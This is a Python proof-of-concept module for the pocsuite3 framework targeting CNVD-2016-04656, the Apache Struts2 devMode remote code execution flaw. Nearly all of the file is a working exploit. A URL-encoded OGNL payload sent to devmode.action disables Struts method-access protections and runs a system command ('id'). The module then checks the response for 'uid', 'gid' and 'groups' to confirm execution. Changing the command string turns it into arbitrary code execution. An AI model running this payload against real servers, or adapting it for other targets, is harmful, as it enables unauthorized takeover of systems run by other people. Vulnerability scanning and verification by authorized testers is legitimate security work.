#!/usr/bin/env python 3.9
# -*- coding: utf-8 -*-
from pocsuite3.api import requests
from pocsuite3.api import Output, POCBase,logger
from pocsuite3.api import register_poc
from urllib.parse import urlparse

class TestPOC(POCBase):
    vulID = 'CNVD-2016-04656'
    version = ''
    author = ['']
    vulDate = ''
    createDate = ''
    updateDate = ''
    references = ['https://www.cnvd.org.cn/flaw/show/CNVD-2016-04656']
    name = 'Apache struts2 devMode远程代码执行漏洞'
    appPowerLink = 'http://struts.apache.org'
    appName = 'Apache Struts'
    appVersion = 'Apache struts >=2.1.0，<=2.5.1'
    vulType = '远程代码执行漏洞'
    desc = '''
        Apache struts2 devMode存在远程代码执行漏洞，该漏洞主要是由于发布系统时开启devMode模式导致的，即当Struts2中的devMode模式设置为true时存在远程代码执行漏洞。若WebService启动权限为最高权限时，攻击者可远程执行任意命令，包括关机、建立新用户、以及删除服务器上所有文件等其他操作。
    '''
    
    def _verify(self):
        result = {}
        flags = ['uid','gid','groups']
        payload = r"/devmode.action?debug=command&expression=%23context%5B%22xwork.MethodAccessor.denyMethodExecution%22%5D%3Dfalse%2C%23f%3D%23_memberAccess.getClass().getDeclaredField(%22allowStaticMethodAccess%22)%2C%23f.setAccessible(true)%2C%23f.set(%23_memberAccess%2Ctrue)%2C%23a%3D%40java.lang.Runtime%40getRuntime().exec(%22id%22).getInputStream()%2C%23b%3Dnew%20java.io.InputStreamReader(%23a)%2C%23c%3Dnew%20java.io.BufferedReader(%23b)%2C%23d%3Dnew%20char%5B50000%5D%2C%23c.read(%23d)%2C%23genxor%3D%23context.get(%22com.opensymphony.xwork2.dispatcher.HttpServletResponse%22).getWriter()%2C%23genxor.println(%23d)%2C%23genxor.flush()%2C%23genxor.close()"
        headers = {"Connection": "close", "Upgrade-Insecure-Requests": "1", "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/94.0.4606.81 Safari/537.36", "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9", "Accept-Encoding": "gzip, deflate", "Accept-Language": "zh-CN,zh;q=0.9"}
        upr = urlparse(self.url)
        if upr.port:
            ports = [upr.port]
        else:
            ports = [8080]
        for port in ports:
            target = '{}://{}:{}'.format(upr.scheme,upr.hostname,port)
            TIMEOUT = 10
            if target:
                vul_url = target + payload
                try:
                    r = requests.get(vul_url, headers=headers, timeout=TIMEOUT, verify=False)
                    if flags[0] in r.text and flags[1] in r.text and flags[2] in r.text:
                        result['VerifyInfo'] ={}
                        result['VerifyInfo']['URL'] = vul_url
                except Exception as e:
                    print(e)
        return self.parse_attack(result)  
    
    def _attack(self):
        return self._verify()

    def parse_attack(self, result):       
        output = Output(self)
        if result:
            output.success(result)
        else:
            output.fail('Internet nothing returned')
        return output                                             

register_poc(TestPOC)
